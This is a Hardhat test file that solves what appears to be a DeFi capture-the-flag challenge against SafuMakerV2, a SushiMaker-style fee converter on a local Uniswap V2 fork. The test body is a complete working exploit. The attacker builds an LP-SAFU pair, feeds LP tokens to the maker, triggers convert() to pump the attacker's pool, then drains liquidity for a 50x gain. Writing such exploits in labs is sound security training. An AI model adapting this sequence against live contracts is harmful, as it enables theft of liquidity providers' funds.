import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";

const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer;
let o1: Signer;
let o2: Signer;
let admin: Signer; // should not be used
let adminUser: Signer; // should not be used
let safuFactory: Contract;
let safuRouter: Contract;
let safuPair: Contract; // starts with just one trading pool: USDC-SAFU
let weth: Contract; // native token
let usdc: Contract; // base trading pair token
let safu: Contract; // farm token
let safuMaker: Contract;
let barAddress = "0x"+"11".repeat(20); // SushiBar contract address, irrelevant for exploit

/// preliminary state
before(async () => {

  accounts = await ethers.getSigners();
  [attacker, o1, o2, admin, adminUser] = accounts;

  // deploying token contracts
  let wethFactory = await ethers.getContractFactory('WETH9')
  weth = await wethFactory.connect(admin).deploy()

  let usdcFactory = await ethers.getContractFactory('Token')
  usdc = await usdcFactory.connect(admin).deploy('USDC','USDC')
  await usdc.connect(admin).mintPerUser( // attacker gets 100
    [await admin.getAddress(), await attacker.getAddress()],
    [precision.mul(1_000_000), precision.mul(100)]
  )

  let safuTokenFactory = await ethers.getContractFactory('Token')
  safu = await safuTokenFactory.connect(admin).deploy('SAFU','SAFU')
  await safu.connect(admin).mintPerUser( // attacker gets 100
    [await admin.getAddress(), await attacker.getAddress()],
    [precision.mul(1_000_000), precision.mul(100)]
  )

  // deploying SafuSwap + SafuMaker contracts
  let safuFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode)
  safuFactory = await safuFactoryFactory.connect(admin).deploy(await admin.getAddress())

  let safuRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode)
  safuRouter = await safuRouterFactory.connect(admin).deploy(safuFactory.address,weth.address)

  let safuMakerFactory = await ethers.getContractFactory('SafuMakerV2')
  safuMaker = await safuMakerFactory.connect(admin).deploy(safuFactory.address,barAddress,safu.address,usdc.address)
  await safuFactory.connect(admin).setFeeTo(safuMaker.address)

  // adding initial liquidity
  await usdc.connect(admin).approve(safuRouter.address,ethers.constants.MaxUint256)
  await safu.connect(admin).approve(safuRouter.address,ethers.constants.MaxUint256)

  await safuRouter.connect(admin).addLiquidity( // creates pair
    usdc.address,
    safu.address,
    precision.mul(1_000_000),
    precision.mul(1_000_000),
    0,
    0,
    await admin.getAddress(),
    (await ethers.provider.getBlock('latest')).timestamp*2
  )

  // getting the USDC-SAFU trading pair
  let pairAddress = await safuFactory.getPair(usdc.address,safu.address)
  let safuPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, admin) // admin required for attach
  safuPair = safuPairFactory.attach(pairAddress)

  // simulates trading activity, as LP is issued to feeTo address for trading rewards
  await safuPair.connect(admin).transfer(safuMaker.address,precision.mul(10_000)) // 1% of LP

});

it("solves the challenge", async function () {

  // setting approval of base tokens
  await usdc.connect(attacker).approve(safuRouter.address,ethers.constants.MaxUint256)
  await safu.connect(attacker).approve(safuRouter.address,ethers.constants.MaxUint256)

  // getting LP tokens for SAFU-USDC pool
  await safuRouter.connect(attacker).addLiquidity(
    usdc.address,
    safu.address,
    precision.mul(10),
    precision.mul(10),
    0,
    0,
    await attacker.getAddress(),
    (await ethers.provider.getBlock('latest')).timestamp*2
  )

  // approving LP tokens for use
  await safuPair.connect(attacker).approve(safuRouter.address,ethers.constants.MaxUint256)

  // creating a new pair of LP-SAFU
  await safuRouter.connect(attacker).addLiquidity(
    safuPair.address,
    safu.address,
    precision.mul(1),
    100,
    0,
    0,
    await attacker.getAddress(),
    (await ethers.provider.getBlock('latest')).timestamp*2
  )

  let attackPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, attacker)
  let attackerPair = attackPairFactory.attach(await safuFactory.getPair(safuPair.address,safu.address))

  // sending some LP of new pair to safuMaker & converting reward funds to SAFU
  let attackerLP = await attackerPair.connect(attacker).balanceOf(await attacker.getAddress())
  await attackerPair.connect(attacker).transfer(safuMaker.address,attackerLP.div(10)) // transfer 10% of LP

  // run the `exploit`
  await safuMaker.connect(attacker).convert(safu.address, safuPair.address)

  // swapping into attack LP pool to get most of the safuPair LP tokens
  // remove liquidity is better than swap, done for laziness bc underflow
  await safuRouter.connect(attacker).swapExactTokensForTokens(
    precision.mul(1),
    0,
    [safu.address,safuPair.address],
    await attacker.getAddress(),
    (await ethers.provider.getBlock('latest')).timestamp*2
  )

  // removing liquidity for the safuPair LP - receive USDC & SAFU
  await safuRouter.connect(attacker).removeLiquidity(
    usdc.address,
    safu.address,
    await safuPair.balanceOf(await attacker.getAddress()),
    0,
    0,
    await attacker.getAddress(),
    (await ethers.provider.getBlock('latest')).timestamp*2
  )

});

/// expected final state
after(async () => {

  // attacker has increased both SAFU and USDC funds by at least 50x
  expect((await usdc.balanceOf(await attacker.getAddress())).div(precision)).to.be.gte(100*50)
  expect((await safu.balanceOf(await attacker.getAddress())).div(precision)).to.be.gte(100*50)

});